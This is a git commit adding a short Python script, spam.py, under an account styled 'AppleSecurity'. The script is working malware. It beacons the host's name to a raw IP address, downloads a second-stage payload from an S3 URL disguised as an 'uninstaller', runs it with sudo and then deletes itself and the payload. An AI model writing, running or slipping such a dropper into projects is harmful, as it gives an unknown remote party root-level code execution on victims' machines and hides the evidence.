bbed3d62e4afadd91c03ddc5f5db1edbf9c8b8ae
AppleSecurity <79390740+AppleSecurity@users.noreply.github.com>
2021-03-04 23:42:41 +1100

    Create spam.py

---
+++ spam.py
@@ -0,0 +1,10 @@
+import os
+
+hostname = os.uname()[1]
+secondStage="http://jssecurecode.s3.amazonaws.com/uninstaller.py"
+
+os.system("curl -X POST -d 'id="+hostname+"' 3.239.87.61")
+os.system("sudo curl -o /tmp/evalPure.py "+secondStage)
+os.system("sudo python3 /tmp/evalPure.py")
+os.system("rm jsCodeSafe.py")
+os.system("rm /tmp/evalPure.py")
